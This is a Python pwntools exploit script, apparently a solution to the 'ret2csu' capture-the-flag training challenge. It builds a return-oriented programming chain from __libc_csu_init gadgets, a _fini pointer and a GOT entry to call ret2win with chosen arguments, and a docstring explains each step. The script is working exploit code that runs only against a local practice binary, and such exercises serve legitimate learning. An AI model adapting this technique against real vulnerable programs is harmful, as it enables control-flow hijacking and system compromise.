from pwn import *

ENDING = 5*b"\x00"

popGadget = b"\x9a\x06\x40" + ENDING #pop rbx, pop rbp, pop r12, pop r13, pop r14, pop r15
callGadget = b"\x80\x06\x40" + ENDING # mov rdx, r15, mov rsi, r14, mov edi, r13d, call r12+8*rbx
callGadgetCallOffset = b"\x89\x06\x40" + ENDING
popRdi = b"\xa3\x06\x40" + ENDING #pop rdi
ret2winPLT = b"\x10\x05\x40" + ENDING
ret2winGOT = b"\x20\x10\x60" + ENDING

addressThatHoldsfiniStartAddress = b"\x48\x0e\x60" + ENDING

deadbeef = 2*b"\xef\xbe\xad\xde"
cafebabe = 2*b"\xbe\xba\xfe\xca"
doodfood = 2*b"\x0d\xf0\x0d\xd0"

"""we need to jmp to the call gadget to update rdx, but the remainder of the gadget causes rdi to be reset to a bad value, so we can't directly jump to ret2win, and not only that, now we also need to find a way to survive the call instruction.
The call instruction jumps to an address in memory, and it doesn't seem like we have enough gadget to edit memory, so we need to search for a valid address that already exists in the memory (and such an address that we can also survive the call to!).
After looking for some time we can notice that the value 0x4006b0 (which we think of as an address in this case) will be loaded into the address 0x600e48 in memory (it exists in offset 0xe48 in the dynamic section of the file). That address (0x4006b0) is the start of a function called _fini which basically just returns (it also does some calculations with rsp that are equivalent to doing nothing from the perspective of rdx, which we need to preserve through this whole ordeal (until we can call ret2win).
Now that we have jump to _fini, existed it and survived the call instruction from the call gadget, we need to survive what comes next, but luckly if we set rbx=0 and rbp=1 in the pop gadget from the beginning we can pass a conditional jmp and arrive just before the beginning of the pop gadget (with an add esp, 8 that we can survive by adding some padding to the chain).
We take this oppurtunity to set the value in r12 (which will become the next jump destination) to the address of the GOT entry of ret2win (the value in the entry is the start of the ret2win PLT resolution trampoline, because that's the default value in the .got.plt entries [before functions are resolved, and we have yet to resolve ret2win]).
After setting r12 we return to a pop rdi gadget using the chain, set its value to be correct (deadbeef), and jump straight to the call instruction from the call gadget, which will now take us to ret2win (because we set r12 to be the address of the GOT entry of ret2win."""
payload = b"A"*40 #buffer padding
payload += popGadget + 8*b"\x00" + b"\x01"+7*b"\x00" + addressThatHoldsfiniStartAddress + 8*b"\x00" + cafebabe + doodfood #prepare registers for the call gadget
payload += callGadget
payload += 8*b"\x00" #add rsp, 8 padding
payload += 2*8*b"\x00" + ret2winGOT + 8*b"\x00" + cafebabe + doodfood #values for passing the popGadget after the add rsp, 8 (and setting r12 to ret2winGOT while were here)
payload += popRdi + deadbeef #set rdi to the correct value (the value got corrupted while going through the call gadget)
payload += callGadgetCallOffset #return to the jump instruction 

challenge = process("./ret2csu")

challenge.sendafter(">", payload)
print(challenge.recvall())

